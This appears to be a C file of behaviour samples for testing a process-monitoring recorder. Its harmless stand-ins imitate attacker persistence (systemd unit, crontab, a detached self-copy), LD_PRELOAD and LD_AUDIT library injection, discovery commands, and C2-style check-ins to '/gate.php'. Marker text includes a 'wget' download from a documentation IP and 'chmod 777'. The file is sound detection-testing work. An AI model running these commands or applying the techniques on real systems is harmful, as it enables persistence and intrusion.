// SPDX-License-Identifier: GPL-3.0-only
// Copyright (c) 2026 MikiMiku (MoreMorePwn)
//
// process-tricks.c — the 0.9.0 scenarios about processes and what the
// recorder decodes: odd exec paths, children that exit at once, a persisted
// copy, preloaded libraries, a signal between siblings, the decoders, a fork
// for the debugger, and the two opt-in long runs (screen ticker, live scan).
//
// The harmless forms: everything written stays in the work directory; every
// program started is this binary (an exec stand-in, SAMPLE_NOOP) or the small
// dynamic child and library embedded at build time (they print a line and
// exit); signals go only to children this sample forked; every wait is
// bounded and an overrunning child is killed by its recorded pid.
#include "samples.h"

#include <errno.h>
#include <fcntl.h>
#include <linux/aio_abi.h>
#include <linux/io_uring.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup 425
#endif
#ifndef SYS_io_uring_enter
#define SYS_io_uring_enter 426
#endif

static void pause_ms(int milliseconds)
{
    struct timespec ts = {.tv_sec = milliseconds / 1000,
                          .tv_nsec = (long)(milliseconds % 1000) * 1000000L};
    while (nanosleep(&ts, &ts) != 0 && errno == EINTR)
        ;
}

static long now_ms(void)
{
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    return (long)now.tv_sec * 1000 + now.tv_nsec / 1000000;
}

// Waits for an own child at most limit_ms; kills that pid (and only it) when it overruns.
static int reap_bounded(pid_t pid, int limit_ms, int *status)
{
    for (int waited = 0; waited <= limit_ms; waited += 5) {
        pid_t done = waitpid(pid, status, WNOHANG);
        if (done == pid)
            return 0;
        if (done < 0 && errno != EINTR)
            return -1;
        pause_ms(5);
    }
    kill(pid, SIGKILL);
    waitpid(pid, status, 0);
    return -1;
}

// <workdir>/<relative>, created.
static int work_subdir(const struct options *options, const char *relative, char *out, size_t cap)
{
    return sample_path(out, cap, options->workdir, relative) == 0 && sample_mkdir_p(out) == 0 ? 0 : -1;
}

// A copy of this binary at `path`, mode 0755 (a chmod in the work directory).
static int copy_self(const char *path)
{
    char self[512];
    return sample_self_path(self, sizeof self) == 0 && sample_copy_file(self, path, 0755, 8u << 20) == 0
               ? 0
               : -1;
}

// ---- odd-exec-paths -------------------------------------------------------------------

SCENARIO(odd_exec_paths)
{
    const char *name = "odd-exec-paths";
    char directory[600], sub[640], binary[700];
    if (work_subdir(options, ".cache", directory, sizeof directory) != 0 ||
        sample_path(sub, sizeof sub, directory, "x") != 0 || sample_mkdir_p(sub) != 0 ||
        sample_path(binary, sizeof binary, directory, "w.bin") != 0 || copy_self(binary) != 0) {
        sample_fail(name, "work directory: %s", strerror(errno));
        return 1;
    }
    char forms[3][720];
    snprintf(forms[0], sizeof forms[0], "%s/./w.bin", directory);
    snprintf(forms[1], sizeof forms[1], "%s/x/../w.bin", directory);
    snprintf(forms[2], sizeof forms[2], "%s//w.bin", directory);
    int ran = 0;
    for (int i = 0; i < 3; i++) {
        char *const argv[] = {"w.bin", NULL};
        int status = sample_spawn(forms[i], argv, NULL, "exit", NULL);
        if (status == 0)
            ran++;
        else
            sample_note(name, "%s did not run (status %d)", forms[i], status);
    }
    sample_pass(name, "wrote %s, then ran it %d/3 times as .../.cache/./w.bin, .../.cache/x/../w.bin "
                   "and .../.cache//w.bin",
             binary, ran);
    sample_note(name, "Triage should show one dropped program, not three base programs");
    return 0;
}

// ---- quick-exit -----------------------------------------------------------------------

SCENARIO(quick_exit)
{
    const char *name = "quick-exit";
    char units[600], unit[700], cron[700];
    if (work_subdir(options, ".config/systemd/user", units, sizeof units) != 0 ||
        sample_path(unit, sizeof unit, units, "demo-quick.service") != 0 ||
        sample_path(cron, sizeof cron, options->workdir, "quick-cron.txt") != 0 ||
        sample_write_text(cron, "* * * * * /tmp/.demo-quick >/dev/null 2>&1\n") != 0) {
        sample_fail(name, "work directory: %s", strerror(errno));
        return 1;
    }
    // A child that writes its unit and is gone a moment later.
    long started = now_ms();
    fflush(stdout);
    pid_t child = fork();
    if (child == 0) {
        int fd = open(unit, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW | O_CLOEXEC, 0600);
        if (fd >= 0) {
            static const char text[] = "[Unit]\nDescription=Quick\n\n[Service]\n"
                                       "ExecStart=/tmp/.demo-quick\n\n[Install]\n"
                                       "WantedBy=default.target\n";
            sample_write_all(fd, text, sizeof text - 1);
            close(fd);
        }
        _exit(0);
    }
    int status = 0;
    if (child < 0 || reap_bounded(child, 4000, &status) != 0) {
        sample_fail(name, "the unit-writing child did not run or overran");
        return 1;
    }
    long lived = now_ms() - started;
    // A stand-in crontab: exec, then exit at once.
    started = now_ms();
    char *const crontab[] = {"crontab", cron, NULL};
    int stand_in = sample_spoof(crontab, NULL);
    long stand_in_ms = now_ms() - started;
    sample_pass(name, "child %d wrote %s and exited after %ld ms; crontab stand-in exited %d after "
                   "%ld ms",
             (int)child, unit, lived, stand_in, stand_in_ms);
    sample_note(name, "with Dump on suspicious activity (core, High) both are held at their exit "
                   "on a revision-22 base");
    return 0;
}

// ---- persisted-copy -------------------------------------------------------------------

#define LINGER_SECONDS "12"

SCENARIO(persisted_copy)
{
    const char *name = "persisted-copy";
    char directory[600], copy[700];
    if (work_subdir(options, ".persist", directory, sizeof directory) != 0 ||
        sample_path(copy, sizeof copy, directory, "xvr-update") != 0 || copy_self(copy) != 0) {
        sample_fail(name, "work directory: %s", strerror(errno));
        return 1;
    }
    int channel[2];
    if (pipe(channel) != 0) {
        sample_fail(name, "pipe: %s", strerror(errno));
        return 1;
    }
    fcntl(channel[0], F_SETFD, FD_CLOEXEC);
    fflush(stdout);
    pid_t child = fork();
    if (child == 0) {
        // The middle process detaches and leaves; the grandchild runs the copy.
        close(channel[0]);
        setsid();
        pid_t grandchild = fork();
        if (grandchild == 0) {
            char *const argv[] = {"xvr-update", NULL};
            char *const env[] = {"SAMPLE_NOOP=linger", "SAMPLE_NOOP_SECONDS=" LINGER_SECONDS, NULL};
            // The write end stays open across the exec: the parent sees EOF
            // when the copy exits.
            execve(copy, argv, env);
            _exit(127);
        }
        int32_t pid = (int32_t)grandchild;
        if (write(channel[1], &pid, sizeof pid) != (ssize_t)sizeof pid)
            _exit(1);
        _exit(grandchild > 0 ? 0 : 1);
    }
    close(channel[1]);
    int status = 0;
    if (child < 0 || reap_bounded(child, 3000, &status) != 0) {
        close(channel[0]);
        sample_fail(name, "the detaching child did not run or overran");
        return 1;
    }
    int32_t grandchild = -1;
    struct pollfd ready = {.fd = channel[0], .events = POLLIN};
    if (poll(&ready, 1, 2000) > 0 && read(channel[0], &grandchild, sizeof grandchild) != sizeof grandchild)
        grandchild = -1;
    if (grandchild <= 0) {
        close(channel[0]);
        sample_unavailable(name, "the grandchild did not start");
        return 0;
    }
    sample_note(name, "detached grandchild %d runs %s for %s s (reparented away from this sample)",
             (int)grandchild, copy, LINGER_SECONDS);
    // Wait for its end: the pipe reports EOF when the copy exits.
    long started = now_ms();
    int ended = 0;
    while (now_ms() - started < 20000) {
        struct pollfd wait_end = {.fd = channel[0], .events = POLLIN};
        if (poll(&wait_end, 1, 500) > 0) {
            char scrap[16];
            if (read(channel[0], scrap, sizeof scrap) <= 0) {
                ended = 1;
                break;
            }
        }
    }
    close(channel[0]);
    if (!ended) {
        kill((pid_t)grandchild, SIGKILL); // the sample's own grandchild, by its recorded pid
        sample_note(name, "the copy overran 20 s and was killed (pid %d)", (int)grandchild);
    }
    sample_pass(name, "copy %s ran detached as pid %d for %ld ms and %s", copy, (int)grandchild,
             now_ms() - started, ended ? "exited" : "was killed");
    return 0;
}

// ---- preload-lib ----------------------------------------------------------------------

// The library and the dynamic child, embedded by build-behavior-samples.sh
// (preload-blobs.S). A build without them (a plain gcc of the .c files) says so.
extern const unsigned char sample_preload_lib[] __attribute__((weak));
extern const unsigned char sample_preload_lib_end[] __attribute__((weak));
extern const unsigned char sample_preload_child[] __attribute__((weak));
extern const unsigned char sample_preload_child_end[] __attribute__((weak));

// The PT_INTERP path of an ELF image, or "" when it has none.
static void interpreter_of(const unsigned char *image, size_t size, char *out, size_t cap)
{
    out[0] = '\0';
    if (size < 52 || memcmp(image, "\177ELF", 4) != 0)
        return;
    int wide = image[4] == 2;
    uint64_t phoff;
    unsigned phentsize, phnum;
    if (wide) {
        if (size < 64)
            return;
        memcpy(&phoff, image + 32, 8);
        phentsize = (unsigned)(image[54] | image[55] << 8);
        phnum = (unsigned)(image[56] | image[57] << 8);
    } else {
        uint32_t offset;
        memcpy(&offset, image + 28, 4);
        phoff = offset;
        phentsize = (unsigned)(image[42] | image[43] << 8);
        phnum = (unsigned)(image[44] | image[45] << 8);
    }
    for (unsigned i = 0; i < phnum; i++) {
        uint64_t at = phoff + (uint64_t)i * phentsize;
        if (at + (wide ? 56 : 32) > size)
            return;
        uint32_t type;
        memcpy(&type, image + at, 4);
        if (type != 3) // PT_INTERP
            continue;
        uint64_t offset, length;
        if (wide) {
            memcpy(&offset, image + at + 8, 8);
            memcpy(&length, image + at + 32, 8);
        } else {
            uint32_t o, l;
            memcpy(&o, image + at + 4, 4);
            memcpy(&l, image + at + 16, 4);
            offset = o;
            length = l;
        }
        if (offset + length > size || length == 0 || length >= cap)
            return;
        memcpy(out, image + offset, length);
        out[length] = '\0';
        return;
    }
}

static void first_line(char *text)
{
    char *end = strchr(text, '\n');
    if (end)
        *end = '\0';
}

SCENARIO(preload_lib)
{
    const char *name = "preload-lib";
    if (!sample_preload_lib || !sample_preload_lib_end || !sample_preload_child ||
        !sample_preload_child_end) {
        sample_unavailable(name, "this build has no embedded library and child (build it with "
                              "tests/monitor/build-behavior-samples.sh)");
        return 0;
    }
    size_t lib_size = (size_t)(sample_preload_lib_end - sample_preload_lib);
    size_t child_size = (size_t)(sample_preload_child_end - sample_preload_child);
    char directory[600], library[700], child[700], etc[600], preload_list[700];
    if (work_subdir(options, ".lib", directory, sizeof directory) != 0 ||
        sample_path(library, sizeof library, directory, "libdemo-preload.so") != 0 ||
        sample_path(child, sizeof child, directory, "preload-child") != 0 ||
        sample_write_bytes(library, sample_preload_lib, lib_size, 0600) != 0 ||
        sample_write_bytes(child, sample_preload_child, child_size, 0600) != 0 ||
        chmod(library, 0755) != 0 || chmod(child, 0755) != 0) {
        sample_fail(name, "work directory: %s", strerror(errno));
        return 1;
    }
    // A lookalike of /etc/ld.so.preload, in the work directory.
    char listed[720];
    snprintf(listed, sizeof listed, "%s\n", library);
    if (work_subdir(options, "etc", etc, sizeof etc) == 0 &&
        sample_path(preload_list, sizeof preload_list, etc, "ld.so.preload") == 0)
        sample_write_text(preload_list, listed);
    char loader[256];
    interpreter_of(sample_preload_child, child_size, loader, sizeof loader);
    int has_loader = loader[0] && access(loader, X_OK) == 0;
    if (!has_loader)
        sample_unavailable(name, "no dynamic loader %s here: the child cannot start and the library "
                              "cannot act (a BusyBox base has one only for its own architecture); "
                              "the exec with LD_PRELOAD and LD_AUDIT is still recorded",
                        loader[0] ? loader : "(none named)");
    static const char *const variables[] = {"LD_PRELOAD", "LD_AUDIT"};
    int loaded = 0;
    for (size_t i = 0; i < 2; i++) {
        char setting[760];
        snprintf(setting, sizeof setting, "%s=%s", variables[i], library);
        char *const env[] = {setting, NULL};
        char *const argv[] = {"preload-child", NULL};
        char output[512];
        int status = sample_spawn_capture(child, argv, env, NULL, NULL, output, sizeof output);
        int acted = strstr(output, "library loaded") != NULL;
        loaded += acted;
        first_line(output);
        if (has_loader)
            sample_pass(name, "child with %s=%s: exit %d, %s", variables[i], library, status,
                     acted ? "the library ran in it" : "the library did not announce itself");
        if (output[0])
            sample_note(name, "child said: %s", output);
    }
    if (has_loader)
        sample_note(name, "%d/2 loads seen; lookalike list %s", loaded, preload_list);
    return 0;
}

// ---- signal-sender --------------------------------------------------------------------

static pid_t sleeper(int seconds)
{
    fflush(stdout);
    pid_t child = fork();
    if (child == 0) {
        pause_ms(seconds * 1000);
        _exit(0);
    }
    return child;
}

static const char *ended_by(int status, char *text, size_t cap)
{
    if (WIFSIGNALED(status))
        snprintf(text, cap, "signal %d", WTERMSIG(status));
    else if (WIFEXITED(status))
        snprintf(text, cap, "exit %d", WEXITSTATUS(status));
    else
        snprintf(text, cap, "status %#x", status);
    return text;
}

SCENARIO(signal_sender)
{
    const char *name = "signal-sender";
    (void)options;
    pid_t term = sleeper(8);
    pid_t killed = sleeper(8);
    if (term < 0 || killed < 0) {
        sample_fail(name, "fork: %s", strerror(errno));
        if (term > 0) {
            kill(term, SIGKILL);
            waitpid(term, NULL, 0);
        }
        return 1;
    }
    fflush(stdout);
    pid_t sender = fork();
    if (sender == 0) {
        // The sender is a sibling of both: it signals them, never anything else.
        kill(term, SIGTERM);
        kill(killed, SIGKILL);
        _exit(0);
    }
    int sender_status = 0, term_status = 0, killed_status = 0;
    if (sender > 0)
        reap_bounded(sender, 3000, &sender_status);
    reap_bounded(term, 3000, &term_status);
    reap_bounded(killed, 3000, &killed_status);
    char first[32], second[32];
    sample_pass(name, "sibling %d sent SIGTERM to %d (ended by %s) and SIGKILL to %d (ended by %s)",
             (int)sender, (int)term, ended_by(term_status, first, sizeof first), (int)killed,
             ended_by(killed_status, second, sizeof second));
    sample_note(name, "Triage's killed-process note should name pid %d as the sender of both",
             (int)sender);
    return 0;
}

// ---- decoders -------------------------------------------------------------------------

static int rename_child(void *context)
{
    (void)context;
    char name[16] = "";
    prctl(PR_SET_NAME, "demo-decoder", 0, 0, 0);
    prctl(PR_GET_NAME, name, 0, 0, 0);
    return strcmp(name, "demo-decoder") == 0 ? 0 : 1;
}

// One IORING_OP_READV of the file through a 4-entry ring; the completion is
// polled at most 2 s. Returns the bytes read, or -1 with errno.
static long uring_read(int file, char *buffer, size_t length)
{
    struct io_uring_params params;
    memset(&params, 0, sizeof params);
    long ring = syscall(SYS_io_uring_setup, 4, &params);
    if (ring < 0)
        return -1;
    size_t sq_size = params.sq_off.array + params.sq_entries * sizeof(unsigned);
    size_t cq_size = params.cq_off.cqes + params.cq_entries * sizeof(struct io_uring_cqe);
    int single = (params.features & IORING_FEAT_SINGLE_MMAP) != 0;
    if (single && cq_size > sq_size)
        sq_size = cq_size;
    long result = -1;
    unsigned char *sq = mmap(NULL, sq_size, PROT_READ | PROT_WRITE, MAP_SHARED, (int)ring,
                             IORING_OFF_SQ_RING);
    unsigned char *cq = single ? sq
                               : mmap(NULL, cq_size, PROT_READ | PROT_WRITE, MAP_SHARED, (int)ring,
                                      IORING_OFF_CQ_RING);
    size_t sqes_size = params.sq_entries * sizeof(struct io_uring_sqe);
    struct io_uring_sqe *sqes = mmap(NULL, sqes_size, PROT_READ | PROT_WRITE, MAP_SHARED, (int)ring,
                                     IORING_OFF_SQES);
    if (sq != MAP_FAILED && cq != MAP_FAILED && sqes != MAP_FAILED) {
        unsigned *tail = (unsigned *)(sq + params.sq_off.tail);
        unsigned mask = *(unsigned *)(sq + params.sq_off.ring_mask);
        unsigned *array = (unsigned *)(sq + params.sq_off.array);
        unsigned slot = *tail & mask;
        struct iovec vector = {.iov_base = buffer, .iov_len = length};
        memset(&sqes[slot], 0, sizeof sqes[slot]);
        sqes[slot].opcode = IORING_OP_READV;
        sqes[slot].fd = file;
        sqes[slot].addr = (uint64_t)(uintptr_t)&vector;
        sqes[slot].len = 1;
        sqes[slot].user_data = 0x0d090;
        array[slot] = slot;
        __atomic_store_n(tail, *tail + 1, __ATOMIC_RELEASE);
        if (syscall(SYS_io_uring_enter, (int)ring, 1, 0, 0, NULL, 0) >= 0) {
            unsigned *head = (unsigned *)(cq + params.cq_off.head);
            unsigned *cq_tail = (unsigned *)(cq + params.cq_off.tail);
            unsigned cq_mask = *(unsigned *)(cq + params.cq_off.ring_mask);
            struct io_uring_cqe *cqes = (struct io_uring_cqe *)(cq + params.cq_off.cqes);
            errno = ETIMEDOUT;
            for (int waited = 0; waited < 2000; waited += 5) {
                if (*head != __atomic_load_n(cq_tail, __ATOMIC_ACQUIRE)) {
                    struct io_uring_cqe *entry = &cqes[*head & cq_mask];
                    result = entry->res;
                    if (entry->res < 0) {
                        errno = -entry->res;
                        result = -1;
                    }
                    __atomic_store_n(head, *head + 1, __ATOMIC_RELEASE);
                    break;
                }
                pause_ms(5);
            }
        }
    }
    int saved = errno;
    if (sqes != MAP_FAILED)
        munmap(sqes, sqes_size);
    if (!single && cq != MAP_FAILED)
        munmap(cq, cq_size);
    if (sq != MAP_FAILED)
        munmap(sq, sq_size);
    close((int)ring);
    errno = saved;
    return result;
}

// One IOCB_CMD_PREAD through a one-slot AIO context, waited for at most 2 s.
static long aio_read(int file, char *buffer, size_t length)
{
    aio_context_t context = 0;
    if (syscall(SYS_io_setup, 1, &context) != 0)
        return -1;
    struct iocb block;
    memset(&block, 0, sizeof block);
    block.aio_data = 0xa10;
    block.aio_lio_opcode = IOCB_CMD_PREAD;
    block.aio_fildes = (uint32_t)file;
    block.aio_buf = (uint64_t)(uintptr_t)buffer;
    block.aio_nbytes = length;
    struct iocb *list[1] = {&block};
    long result = -1;
    if (syscall(SYS_io_submit, context, 1, list) == 1) {
        struct io_event event;
        // The kernel's own timespec layout: two longs.
        struct {
            long seconds;
            long nanoseconds;
        } wait = {2, 0};
#ifdef SYS_io_getevents
        long got = syscall(SYS_io_getevents, context, 1, 1, &event, &wait);
#else
        long got = syscall(SYS_io_pgetevents, context, 1, 1, &event, &wait, NULL);
#endif
        if (got == 1)
            result = (long)event.res;
        else
            errno = ETIMEDOUT;
    }
    int saved = errno;
    syscall(SYS_io_destroy, context);
    errno = saved;
    return result;
}

SCENARIO(decoders)
{
    const char *name = "decoders";
    // FIONREAD and FIONBIO on a pipe and on a socket.
    int pipe_ends[2], pending_pipe = -1, pending_socket = -1, on = 1;
    int pipe_ok = 0, socket_ok = 0;
    if (pipe2(pipe_ends, O_CLOEXEC) == 0) {
        if (write(pipe_ends[1], "demo!", 5) == 5)
            pipe_ok = ioctl(pipe_ends[0], FIONREAD, &pending_pipe) == 0;
        pipe_ok &= ioctl(pipe_ends[0], FIONBIO, &on) == 0;
        close(pipe_ends[0]);
        close(pipe_ends[1]);
    }
    int pair[2];
    if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, pair) == 0) {
        if (write(pair[1], "decoder", 7) == 7)
            socket_ok = ioctl(pair[0], FIONREAD, &pending_socket) == 0;
        socket_ok &= ioctl(pair[0], FIONBIO, &on) == 0;
        close(pair[0]);
        close(pair[1]);
    }
    int udp = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    int udp_pending = -1;
    if (udp >= 0) {
        ioctl(udp, FIONREAD, &udp_pending);
        ioctl(udp, FIONBIO, &on);
        close(udp);
    }
    sample_pass(name, "FIONREAD/FIONBIO: pipe %s (%d pending), socket pair %s (%d pending), UDP "
                   "socket %d pending",
             pipe_ok ? "ok" : "refused", pending_pipe, socket_ok ? "ok" : "refused",
             pending_socket, udp_pending);

#if (defined(__x86_64__) || defined(__i386__)) && defined(SYS_arch_prctl)
    unsigned long value = 0;
    long cpuid = syscall(SYS_arch_prctl, 0x1011 /* ARCH_GET_CPUID */, 0);
#ifdef __x86_64__
    long fs = syscall(SYS_arch_prctl, 0x1003 /* ARCH_GET_FS */, &value);
    long cet = syscall(SYS_arch_prctl, 0x3001 /* ARCH_CET_STATUS */, &value);
    sample_pass(name, "arch_prctl: ARCH_GET_CPUID %ld, ARCH_GET_FS %ld, ARCH_CET_STATUS %ld (%s)",
             cpuid, fs, cet, cet == 0 ? "answered" : "refused, as on current kernels");
#else
    (void)value;
    sample_pass(name, "arch_prctl: ARCH_GET_CPUID %ld", cpuid);
#endif
#else
    sample_skip(name, "arch_prctl exists on x86 only");
#endif

    int renamed = sample_in_child(rename_child, NULL, 2000);
    sample_pass(name, "a child named itself demo-decoder with PR_SET_NAME and read it back with "
                   "PR_GET_NAME (%s)",
             renamed == 0 ? "ok" : "failed");

    char path[600];
    static const char content[] = "io_uring and AIO read this line\n";
    if (sample_path(path, sizeof path, options->workdir, "decoders.txt") != 0 ||
        sample_write_text(path, content) != 0) {
        sample_fail(name, "work directory: %s", strerror(errno));
        return 1;
    }
    int file = open(path, O_RDONLY | O_CLOEXEC);
    if (file < 0) {
        sample_fail(name, "%s: %s", path, strerror(errno));
        return 1;
    }
    char buffer[128];
    long uring = uring_read(file, buffer, sizeof buffer);
    if (uring >= 0)
        sample_pass(name, "io_uring: one READV of %s through a 4-entry ring: %ld bytes", path, uring);
    else
        sample_unavailable(name, "io_uring: %s (a kernel or sysctl that disables io_uring)",
                        strerror(errno));
    long aio = aio_read(file, buffer, sizeof buffer);
    if (aio >= 0)
        sample_pass(name, "AIO: io_setup, io_submit(IOCB_CMD_PREAD), io_getevents, io_destroy: %ld "
                       "bytes", aio);
    else
        sample_unavailable(name, "AIO: %s", strerror(errno));
    close(file);
    return 0;
}

// ---- fork-debug -----------------------------------------------------------------------

volatile int demo_fork_marks;

// Break here: called before the fork, in the child and after the fork.
__attribute__((noinline, used)) int demo_fork_breakpoint(int stage)
{
    demo_fork_marks += stage;
    __asm__ volatile("" ::: "memory");
    return demo_fork_marks;
}

SCENARIO(fork_debug)
{
    const char *name = "fork-debug";
    (void)options;
    sample_note(name, "break on demo_fork_breakpoint at %p (pid %d)",
             (void *)(uintptr_t)demo_fork_breakpoint, (int)getpid());
    demo_fork_breakpoint(1);
    fflush(stdout);
    pid_t child = fork();
    if (child == 0) {
        // The child passes the breakpoint twice and reports how far it got.
        demo_fork_breakpoint(10);
        int marks = demo_fork_breakpoint(100);
        _exit(marks == 111 ? 0 : 3);
    }
    int status = 0;
    int reaped = child > 0 ? reap_bounded(child, 5000, &status) : -1;
    demo_fork_breakpoint(1000);
    if (child < 0 || reaped != 0)
        sample_unavailable(name, "the child did not finish in 5 s (stopped by a debugger?)");
    else if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
        sample_pass(name, "child %d ran its own code past demo_fork_breakpoint twice and exited 0",
                 (int)child);
    else if (WIFSIGNALED(status))
        sample_note(name, "child %d ended by signal %d (SIGTRAP is the old INT3 behaviour)",
                 (int)child, WTERMSIG(status));
    else
        sample_note(name, "child %d exited %d", (int)child, WEXITSTATUS(status));
    return 0;
}

// ---- screen-ticker --------------------------------------------------------------------

SCENARIO(screen_ticker)
{
    const char *name = "screen-ticker";
    int seconds = options->screen_seconds;
    if (seconds < 1)
        seconds = 1;
    if (seconds > SAMPLE_MAX_SCREEN_SECONDS)
        seconds = SAMPLE_MAX_SCREEN_SECONDS;
    // The console, when this user may write to it (root in a guest); never created.
    int console = open("/dev/console", O_WRONLY | O_NOCTTY | O_APPEND | O_CLOEXEC);
    static const char spinner[] = "|/-\\";
    long started = now_ms();
    for (int tick = 1; tick <= seconds; tick++) {
        char bar[41];
        int filled = tick * 40 / seconds;
        for (int i = 0; i < 40; i++)
            bar[i] = i < filled ? '#' : '.';
        bar[40] = '\0';
        char text[160];
        int length = snprintf(text, sizeof text, "TICK        %-17s t+%03d s %c [%s] %d/%d\n", name,
                              tick, spinner[tick % 4], bar, tick, seconds);
        fputs(text, stdout);
        fflush(stdout);
        if (console >= 0 && length > 0)
            sample_write_all(console, text, (size_t)length);
        long next = started + (long)tick * 1000;
        long wait = next - now_ms();
        if (tick < seconds && wait > 0)
            pause_ms((int)wait);
    }
    if (console >= 0)
        close(console);
    sample_pass(name, "%d lines, one a second%s", seconds,
             console >= 0 ? ", also on /dev/console" : " (stdout only: /dev/console not writable)");
    return 0;
}

// ---- live-scan ------------------------------------------------------------------------

#define LIVE_ROUNDS 16
#define LIVE_PERIOD_MS 10000

static const char *find_program(const char *program, char *out, size_t cap)
{
    static const char *const directories[] = {"/bin", "/usr/bin", "/sbin", "/usr/sbin"};
    for (size_t i = 0; i < sizeof directories / sizeof directories[0]; i++) {
        snprintf(out, cap, "%s/%s", directories[i], program);
        if (access(out, X_OK) == 0)
            return out;
    }
    return NULL;
}

SCENARIO(live_scan)
{
    const char *name = "live-scan";
    char directory[600], cron[700];
    if (work_subdir(options, "live", directory, sizeof directory) != 0 ||
        sample_path(cron, sizeof cron, directory, "cron.txt") != 0 ||
        sample_write_text(cron, "*/5 * * * * /tmp/.demo-live >/dev/null 2>&1\n") != 0) {
        sample_fail(name, "work directory: %s", strerror(errno));
        return 1;
    }
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    long started = now_ms();
    int commands = 0, checkins = 0;
    for (int round = 1; round <= LIVE_ROUNDS; round++) {
        char markers[700], text[512];
        snprintf(markers, sizeof markers, "%s/markers-%02d.txt", directory, round);
        snprintf(text, sizeof text,
                 "DEMO_BEHAVIOR_SAMPLE_v2 live-scan round %d\nT1053.003 attack.persistence\n"
                 "wget -qO- http://198.51.100.23/download.bin\nchmod 777 /tmp/.x\n"
                 "LD_PRELOAD=/tmp/libx.so\ncrontab -l\n",
                 round);
        sample_write_text(markers, text);
        char *const crontab[] = {"crontab", cron, NULL};
        sample_spoof(crontab, NULL);
        static const char *const programs[][3] = {{"uname", "-a", NULL}, {"id", NULL, NULL}};
        for (size_t i = 0; i < 2; i++) {
            char path[64], output[256];
            if (!find_program(programs[i][0], path, sizeof path))
                continue;
            char *const argv[] = {(char *)programs[i][0], (char *)programs[i][1], NULL};
            if (sample_spawn_capture(path, argv, NULL, NULL, NULL, output, sizeof output) == 0)
                commands++;
        }
        char body[128];
        snprintf(body, sizeof body, "scenario=live-scan&round=%d", round);
        if (sample_http_request(host, port, "POST", "/gate.php", body, strlen(body), NULL) == 0)
            checkins++;
        sample_note(name, "round %d/%d at t+%ld s: markers, crontab stand-in, uname/id, check-in",
                 round, LIVE_ROUNDS, (now_ms() - started) / 1000);
        long wait = started + (long)round * LIVE_PERIOD_MS - now_ms();
        if (round < LIVE_ROUNDS && wait > 0)
            pause_ms((int)wait);
    }
    sample_pass(name, "%d rounds over %ld s: %d discovery commands, %d/%d check-ins to %s:%d",
             LIVE_ROUNDS, (now_ms() - started) / 1000, commands, checkins, LIVE_ROUNDS, host, port);
    return 0;
}
